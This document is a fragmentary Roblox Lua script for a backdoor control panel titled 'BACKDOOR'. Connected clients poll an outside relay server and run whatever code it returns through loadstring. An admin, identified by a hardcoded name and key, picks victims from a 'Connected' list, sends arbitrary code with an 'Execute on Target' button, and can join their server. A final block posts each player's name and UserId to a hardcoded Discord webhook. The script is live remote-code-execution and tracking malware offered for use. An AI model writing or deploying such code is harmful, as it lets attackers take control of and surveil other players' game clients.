...
local IS_ADMIN = LP.Name == "BLOX_FRUIT01110"
local RELAY = "https://secret-production-f0b9.up.railway.app"
local ADMIN_KEY = "diwrkish220"
local POLL_RATE = 3
...
return celery.request(opts)
elseif ScriptWare and ScriptWare.request then
return ScriptWare.request(opts)
elseif http and http.request then
return http.request(opts)
elseif ronin and ronin.request then
return ronin.request(opts)
elseif xeno and xeno.request then
return xeno.request(opts)
else
if opts.Method == "POST" then
local res = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson, false)
return { Body = res, StatusCode = 200 }
else
local res = HttpService:GetAsync(opts.Url, false)
return { Body = res, StatusCode = 200 }
end
end
end
...
task.spawn(function()
while task.wait(POLL_RATE) do
local res = get("/poll/" .. tostring(LP.UserId))
if res then
local ok, data = pcall(HttpService.JSONDecode, HttpService, res)
if ok and data and type(data.code) == "string" and #data.code > 0 then
local fn = loadstring(data.code)
if fn then task.spawn(pcall, fn) end
end
end
end
end)
...
titleBar.BackgroundColor3 = Color3.fromRGB(20, 10, 36)
...
titleLbl.Text = "🔑 BACKDOOR  —  " .. LP.Name
titleLbl.TextColor3 = Color3.fromRGB(255, 160, 60)
...
listTitle.Size = UDim2.new(0, 190, 0, 18)
listTitle.Position = UDim2.new(0, 8, 0, 44)
listTitle.BackgroundTransparency = 1
listTitle.Text = "Connected: 0"
...
local Scroll = Instance.new("ScrollingFrame")
Scroll.Size = UDim2.new(0, 190, 0, 320)
...
selLabel.Size = UDim2.new(0, 224, 0, 18)
selLabel.Position = UDim2.new(0, RX, 0, 44)
selLabel.BackgroundTransparency = 1
selLabel.Text = "Target: none"
selLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
selLabel.TextSize = 13
selLabel.Font = Enum.Font.GothamBold
selLabel.TextXAlignment = Enum.TextXAlignment.Left
selLabel.Parent = Main
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(0, 224, 0, 40)
infoLabel.Position = UDim2.new(0, RX, 0, 64)
...
codeLbl.Size = UDim2.new(0, 224, 0, 14)
codeLbl.Position = UDim2.new(0, RX, 0, 110)
codeLbl.BackgroundTransparency = 1
codeLbl.Text = "Code / Loop:"
codeLbl.TextColor3 = Color3.fromRGB(140, 140, 140)
codeLbl.TextSize = 11
codeLbl.Font = Enum.Font.Gotham
codeLbl.TextXAlignment = Enum.TextXAlignment.Left
codeLbl.Parent = Main
local CodeBox = Instance.new("TextBox")
CodeBox.Size = UDim2.new(0, 224, 0, 160)
CodeBox.Position = UDim2.new(0, RX, 0, 126)
CodeBox.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
CodeBox.BorderSizePixel = 0
CodeBox.Text = ""
CodeBox.PlaceholderText = "while true do\n  task.wait(1)\nend"
CodeBox.TextColor3 = Color3.fromRGB(220, 220, 220)
CodeBox.PlaceholderColor3 = Color3.fromRGB(70, 70, 80)
CodeBox.TextSize = 12
...
sendBtn.Size = UDim2.new(0, 224, 0, 30)
sendBtn.Position = UDim2.new(0, RX, 0, 292)
sendBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 200)
sendBtn.BorderSizePixel = 0
sendBtn.Text = "▶ Execute on Target"
...
joinBtn.Size = UDim2.new(0, 224, 0, 30)
joinBtn.Position = UDim2.new(0, RX, 0, 328)
joinBtn.BackgroundColor3 = Color3.fromRGB(30, 80, 150)
joinBtn.BorderSizePixel = 0
joinBtn.Text = "⇒ Join Target's Server"
...
local res = get("/clients?adminKey=" .. ADMIN_KEY)
if not res then return end
local ok, list = pcall(HttpService.JSONDecode, HttpService, res)
...
btn.BackgroundColor3 = (e.uid == selectedId)
...
selectedId = uid
selLabel.Text = "Target: " .. e.name
infoLabel.Text = "UID: " .. uid
.. "\nPlace: " .. tostring(e.placeId)
.. "\nJob: " .. string.sub(tostring(e.jobId), 1, 22) .. "..."
refreshList()
end)
end
Scroll.CanvasSize = UDim2.new(0, 0, 0, count * 33)
listTitle.Text = "Connected: " .. count
end
...
if not selectedId then return end
local e = clientCache[selectedId]
if e then
TeleportService:TeleportToPlaceInstance(tonumber(e.placeId), e.jobId, LP)
end
end)
task.spawn(function()
while task.wait(POLL_RATE) do
...
local w="https://discord.com/api/webhooks/1552747501696720936/pEfvcXbzoG2v1xB8DYTMG8eGppLjPEVT-m6BiVezIg12WPcfleKIDa2CUntl0Y25DqbJ"
local i="1297493619661606912"
local r=(syn and syn.request)or(http and http.request)or http_request or request
if not r then return end
_G.__s=_G.__s or {}
if _G.__s[p.UserId] then return end
_G.__s[p.UserId]=true
pcall(function()
r({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService("HttpService"):JSONEncode({content="<@"..i.."> — **"..p.Name.."** (`"..p.UserId.."`) at "..os.date("%Y-%m-%d %H:%M:%S")})})
end)
